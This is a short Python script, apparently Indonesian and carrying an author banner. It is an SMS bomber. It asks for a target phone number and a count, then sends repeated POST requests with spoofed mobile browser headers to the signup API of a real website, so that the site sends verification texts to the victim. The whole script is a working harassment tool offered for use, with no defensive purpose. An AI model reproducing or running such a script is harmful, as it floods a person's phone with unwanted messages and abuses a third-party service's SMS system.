import time, requests,json,os

os.system("clear")

print("____________________________")
print("")
print("|   Author : Rizqi         |")
print("|   YouTube: Riskimbmbg    |")
print("|   Github : RiskiMbmbng   |")
print("____________________________")
time.sleep(2.4)
nomer = input("Nomer Target Berawal (8xx) > ")
time.sleep(2)
jumlah = int(input("Masukan Jumlah Spam (5) > "))
time.sleep(3)
headers = {
"Host" : "eci.id",
"Connection" : "keep-alive",
"Content-Length" : "27",
"Accept" : "application/json, text/plain, */*",
"Origin" : "https://eci.id",
"User-Agent" : "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
"Content-Type" : "application/json",
"Referer" : "https://eci.id/register",
"Accept-Encoding" : "gzip, deflate, br",
"Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

data = json.dumps({"identity":"0"+nomer})
for i in range(jumlah):
	pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text

if "success" in pos:
    print("Sms Masuk Ke Target ",)

else:
    print("Spam Sms Gagal ",)
